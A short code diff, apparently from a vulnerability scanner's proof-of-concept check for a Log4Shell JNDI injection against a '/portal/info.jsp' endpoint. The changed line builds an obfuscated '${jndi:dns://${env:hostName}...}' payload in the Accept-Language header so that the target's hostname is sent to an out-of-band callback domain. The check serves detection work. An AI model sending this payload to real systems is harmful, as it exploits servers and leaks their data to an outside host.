@@ -43,7 +43,7 @@ def poc(url):
         path = """/portal/info.jsp"""
         method = "GET"
         data = """"""
-        headers = {'Accept-Language': '${jndi:${lower:d}n${lower:s}://${env:hostName}.oob_domain}'}
+        headers = {'Accept-Language': '${jndi:${lower:d}n${lower:s}://${env:hostName}.%s}' % oob_domain}
         resp0 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)
 
         if verify_request(type="dns", flag=flag):
